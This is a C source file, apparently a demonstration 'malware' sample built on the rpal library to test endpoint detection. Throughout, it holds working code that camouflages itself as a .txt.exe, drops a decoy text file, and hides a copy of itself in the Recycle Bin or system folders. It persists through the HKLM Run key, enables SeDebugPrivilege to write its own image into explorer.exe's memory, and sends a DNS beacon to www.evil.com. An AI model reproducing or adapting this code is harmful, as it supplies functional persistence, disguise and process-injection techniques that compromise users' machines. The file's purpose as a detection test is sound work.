#include <rpal/rpal.h>
#include <processLib/processLib.h>
#include <librpcm/librpcm.h>
#include <rpHostCommonPlatformLib/rTags.h>
#include <windows.h>
#include <Windns.h>
#include <shellapi.h>


/*
 * This malware.
 * Uses a global mutex to check for concurrent running.
 * Writes itself to the recycler bin for bootstrap upon first exec.
 * Bootstraps via a startup key to the recycler bin location.
 * Camouflages as a .txt.exe, on exec outside recycler it installs and drops a dummy txt file and opens it.
 * During main exec it will inject itself into an svchost. This is a dummy injection for the moment just to prove detection of PE.
 *
 */

static RWCHAR g_self_path[ MAX_PATH ] = {0};


static RVOID
    dropDecoyTextFile
    (

    )
{
    RWCHAR execVerb[] = _WCH( "open" );

    RNCHAR decoyText[] = _NC( "To a trained eye, this file is clearly evil.\r\nUnfortunately most users won't see it.\r\nAt the end of the day it won't matter because once you see this, the game is over." );
    
    RWCHAR decoyPath[ MAX_PATH ] = {0};
    RU32 i = 0;

    // Generate new path for the decoy, same as current minus the .exe
    if( rpal_string_strcpy( decoyPath, g_self_path ) )
    {
        if( 4 < ( i = rpal_string_strlen( decoyPath ) ) )
        {
            decoyPath[ i - 4 ] = 0;

            if( rpal_file_write( decoyPath, decoyText, rpal_string_strlen( decoyText ), TRUE ) )
            {
                rpal_debug_info( "successfully wrote decoy file: %ls", decoyPath );

                rpal_debug_info( "launching text file reader app..." );
                if( 32 < (INT)(SIZE_T)ShellExecuteW( NULL, execVerb, decoyPath, NULL, NULL, SW_SHOWNORMAL ) )
                {
                    rpal_debug_info( "decoy successfully launched." );
                }
                else
                {
                    rpal_debug_error( "error launching decoy app." );
                }
            }
            else
            {
                rpal_debug_error( "error writing decoy file." );
            }
        }
        else
        {
            rpal_debug_error( "expecting the current file path to be at least 4, very unexpected!" );
        }
    }
}

static RBOOL 
    SetPrivilege
    (
        HANDLE hToken, 
        RPNCHAR lpszPrivilege, 
        BOOL bEnablePrivilege
    )
{
    LUID luid;
    RBOOL bRet = FALSE;

    if( LookupPrivilegeValueW( NULL, lpszPrivilege, &luid ) )
    {
        TOKEN_PRIVILEGES tp;

        tp.PrivilegeCount=1;
        tp.Privileges[0].Luid=luid;
        tp.Privileges[0].Attributes=(bEnablePrivilege) ? SE_PRIVILEGE_ENABLED: 0;
        //
        //  Enable the privilege or disable all privileges.
        //
        if( AdjustTokenPrivileges( hToken, FALSE, &tp, 0, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL ) )
        {
            //
            //  Check to see if you have proper access.
            //  You may get "ERROR_NOT_ALL_ASSIGNED".
            //
            bRet = ( GetLastError() == ERROR_SUCCESS );
        }
    }
    return bRet;
}

static RBOOL
	Get_Privilege
	(
		RPNCHAR privName
	)
{
	RBOOL isSuccess = FALSE;

	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;

	hProcess = GetCurrentProcess();

	if( NULL != hProcess )
	{
		if( OpenProcessToken( hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken ) )
		{
			if( SetPrivilege( hToken, privName, TRUE ) )
			{
				isSuccess = TRUE;
			}
			
			CloseHandle( hToken );
		}
	}

	return isSuccess;
}

static RVOID
    injectIntoProcess
    (

    )
{
    RNCHAR strSeDebug[] = _NC( "SeDebugPrivilege" );
    processLibProcEntry* procIds = NULL;
    processLibProcEntry* tmpProcId = NULL;
    rSequence targetProc = NULL;
    RU32 targetPid = 0;
    RPWCHAR procName = NULL;
    RWCHAR targetProcName[] = _WCH( "EXPLORER.EXE" );

    HANDLE hProc = NULL;
    RU32 selfSize = 0;

    RPVOID remoteDest = NULL;

    SIZE_T payloadSize = 0;
    RPU8 payloadBuff = NULL;
    
    rpal_debug_info( "getting debug privilege to inject..." );
    if( !Get_Privilege( strSeDebug ) )
    {
        rpal_debug_error( "could not get debug privilege, are we running as admin?" );
        return;
    }

    rpal_debug_info( "getting process list to find explorer.exe" );
    procIds = processLib_getProcessEntries( FALSE );
    tmpProcId = procIds;
    while( NULL != tmpProcId )
    {
        if( NULL != ( targetProc = processLib_getProcessInfo( tmpProcId->pid, NULL ) ) )
        {
            if( rSequence_getSTRINGN( targetProc, RP_TAGS_FILE_PATH, &procName ) )
            {
                rpal_string_toupper( procName );
                if( NULL != rpal_string_strstr( procName, targetProcName ) )
                {
                    rpal_debug_info( "found the target process: %d", tmpProcId->pid );
                    targetPid = tmpProcId->pid;
                }
                else
                {
                    rpal_debug_info( "not target process, next..." );
                }
            }
            else
            {
                rpal_debug_warning( "process without file path, odd..." );
            }

            rSequence_free( targetProc );
            targetProc = NULL;

            if( 0 != targetPid )
            {
                break;
            }
        }

        tmpProcId++;
    }

    rpal_memory_free( procIds );

    if( 0 != targetPid )
    {
        rpal_debug_info( "getting size of self..." );
        if( (RU32)(-1) != ( selfSize = rpal_file_getSize( g_self_path, FALSE ) ) )
        {
            rpal_debug_info( "opening target process with right privileges..." );
            if( NULL != ( hProc = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid ) ) )
            {
                rpal_debug_info( "allocating required memory in remote process..." );
                if( NULL != ( remoteDest = VirtualAllocEx( hProc, NULL, selfSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE ) ) )
                {
                    rpal_debug_info( "reading payload to memory before writing it to remote." );
                    if( rpal_file_read( g_self_path, &payloadBuff, (RU32*)&payloadSize, FALSE ) )
                    {
                        rpal_debug_info( "writing payload to remote process." );
                        if( WriteProcessMemory( hProc, remoteDest, payloadBuff, payloadSize, &payloadSize ) &&
                            payloadSize == selfSize )
                        {
                            rpal_debug_info( "successfully written payload to remote process. This should look like an injected PE although no thread was started." );
                        }
                        else
                        {
                            rpal_debug_error( "error writing payload to remote process." );
                        }

                        rpal_memory_free( payloadBuff );
                    }
                    else
                    {
                        rpal_debug_error( "error reading ourselves as payload." );
                    }
                }
                else
                {
                    rpal_debug_error( "error allocating memory in remote process." );
                }

                CloseHandle( hProc );
            }
            else
            {
                rpal_debug_error( "error opening process with VM privilges." );
            }
        }
        else
        {
            rpal_debug_error( "error getting size of self." );
        }
    }
}



static RVOID
    checkBootstrap
    (

    )
{
    HKEY hKeyRoot = HKEY_LOCAL_MACHINE;
    RWCHAR regKey[] = _WCH( "Software\\Microsoft\\Windows\\CurrentVersion\\Run" );
    HKEY hKey = NULL;

    rpal_debug_info( "opening reg bootstrap key..." );
    if( ERROR_SUCCESS == RegOpenKeyExW( hKeyRoot, regKey, 0, KEY_WRITE, &hKey ) )
    {
        rpal_debug_info( "setting bootstrap key to current exe location..." );
        if( ERROR_SUCCESS == RegSetValueExW( hKey, _WCH(""), 0, REG_SZ, (RPU8)g_self_path, ( rpal_string_strlen( g_self_path ) + 1 ) * sizeof( RWCHAR ) ) )
        {
            rpal_debug_info( "successfully set bootstrap key!" );
        }
        else
        {
            rpal_debug_error( "error setting bootstrap key to current location." );
        }

        RegCloseKey( hKey );
    }
    else
    {
        rpal_debug_error( "error opening reg bootstrap key." );
    }
}


static RVOID
    relaunchInPermanentLocation
    (

    )
{
    RPWCHAR bootstrapLocations[] = { _WCH( "%SYSTEMDRIVE%\\$Recycle.Bin\\MALWARE_DEMO_WINDOWS_1.exe" ),
                                     _WCH( "%SYSTEMDRIVE%\\RECYCLER\\MALWARE_DEMO_WINDOWS_1.exe" ),
                                     _WCH( "%windir%\\system32\\tasks\\MALWARE_DEMO_WINDOWS_1.exe" ),
                                     _WCH( "%USERPROFILE%\\MALWARE_DEMO_WINDOWS_1.exe" ) };
    RU32 i = 0;

    STARTUPINFOW startupInfo = {0};
    PROCESS_INFORMATION procInfo = {0};
    RPWCHAR expandedPath = NULL;

    for( i = 0; i < ARRAY_N_ELEM( bootstrapLocations ); i++ )
    {
        rpal_debug_info( "trying to move to bootstrap location %d...", i );
        rpal_file_delete( bootstrapLocations[ i ], FALSE );
        if( rpal_file_move( g_self_path, bootstrapLocations[ i ] ) )
        {
            rpal_debug_info( "successfully moved to bootstrap location!" );

            rpal_debug_info( "launching in new location (%ls)...", bootstrapLocations[ i ] );
            if( rpal_string_expand( bootstrapLocations[ i ], &expandedPath ) &&
                0 != CreateProcessW( expandedPath, 
                                     NULL, 
                                     NULL, 
                                     NULL, 
                                     FALSE, 
                                     CREATE_NO_WINDOW, 
                                     NULL, 
                                     NULL, 
                                     &startupInfo, 
                                     &procInfo ) )
            {
                rpal_debug_info( "successfully launched from new location." );
            }
            else
            {
                rpal_debug_error( "error launching from permanent location: %d.", GetLastError() );
            }

            if( NULL != expandedPath )
            {
                rpal_memory_free( expandedPath );
            }

            break;
        }
        else
        {
            rpal_debug_warning( "could not move to new bootstrap location, may not have permission..." );
        }
    }
}

static RVOID
    simulateBeacon
    (

    )
{
    RNCHAR dnsDll[] = _NC( "dnsapi.dll" );
    RCHAR dnsAPI[] = "DnsQuery_W";
    RNCHAR dns[] = _NC( "www.evil.com" );
    HMODULE hDns = NULL;
    DNS_STATUS (WINAPI *DnsQuery_f)( PCTSTR lpstrName, WORD wType, DWORD Options, PVOID pExtra, PDNS_RECORD *ppQueryResultsSet, PVOID *pReserved );
    DNS_STATUS status = 0;
    PDNS_RECORDW unused = NULL;

    rpal_debug_info( "loading DnsApi..." );
    if( NULL != ( hDns = LoadLibraryW( dnsDll ) ) &&
        NULL != ( *(FARPROC*)&DnsQuery_f = GetProcAddress( hDns, dnsAPI ) ) )
    {
        rpal_debug_info( "sending DNS beacon to %s...", dns );
        if( ERROR_SUCCESS == ( status = DnsQuery_f( dns, DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &unused, NULL ) ) )
        {
            rpal_debug_info( "successfully sent a DNS beacon." );
        }
        else
        {
            rpal_debug_error( "error sending DNS beacon: %d.", status );
        }
    }
    else
    {
        rpal_debug_error( "error loading DnsApi." );
    }
}

RPAL_NATIVE_MAIN
{
    RU32 memUsed = 0;
    RWCHAR global_mutex_name[] = _WCH( "\\GLOBAL\\evil_mutex" );
    HANDLE hGlobalMutex = NULL;

    HMODULE hSelf = NULL;

    RWCHAR installLoccheck[] = _WCH( ".TXT.EXE" );
    RBOOL isNeedsInstallation = FALSE;

    UNREFERENCED_PARAMETER( argc );
    UNREFERENCED_PARAMETER( argv );

    rpal_debug_info( "initializing..." );
    if( rpal_initialize( NULL, 0 ) )
    {
        // Startup
        //======================================

        rpal_debug_info( "getting current exec location..." );
        if( NULL == ( hSelf = GetModuleHandleW( NULL ) ) ||
            0 == GetModuleFileNameW( hSelf, g_self_path, MAX_PATH ) )
        {
            rpal_debug_error( "could not determine exec location." );
            return -1;
        }

        rpal_debug_info( "checking if we need to install..." );
        rpal_string_toupper( g_self_path );
        if( NULL != rpal_string_strstr( g_self_path, installLoccheck ) )
        {
            // The initial installer is named "evil.txt.exe" to camouflage
            // but when we install we remove the .txt to appear more legit.
            // So if we don't find .txt. we can assume we've installed correctly.
            isNeedsInstallation = TRUE;
        }

        // This is the main behaviour switch
        //======================================
        if( isNeedsInstallation )
        {
            // We do the txt drop and install in the background to RECYCLER
            dropDecoyTextFile();

            // Re-launch ourselves in the new permanent location
            relaunchInPermanentLocation();

            // We don't do really anything here so we'll simulate it a bit
            // with a dummy timeout.
            rpal_thread_sleep( 500 );
        }
        else
        {
            rpal_debug_info( "checking global mutex..." );
            if( NULL == ( hGlobalMutex = CreateMutexW( NULL, FALSE, global_mutex_name ) ) &&
                ERROR_ALREADY_EXISTS == GetLastError() )
            {
                rpal_debug_warning( "mutex already existing, bail." );
                return 0;
            }

            // Simulate simple beacon
            simulateBeacon();

            // We just inject in a explorer.exe
            injectIntoProcess();

            // Make sure the bootstrap is present
            checkBootstrap();
        }


        // Teardown
        //======================================

        rpal_debug_info( "closing global mutex..." );
        CloseHandle( hGlobalMutex );

        rpal_debug_info( "...exiting..." );
        rpal_Context_cleanup();

#ifdef RPAL_PLATFORM_DEBUG
        memUsed = rpal_memory_totalUsed();
        if( 0 != memUsed )
        {
            rpal_debug_critical( "Memory leak: %d bytes.\n", memUsed );
            rpal_memory_findMemory();
        }
#else
        UNREFERENCED_PARAMETER( memUsed );
#endif
        
        rpal_Context_deinitialize();
    }
    else
    {
        rpal_debug_error( "error initializing rpal." );
    }

    return 0;
}
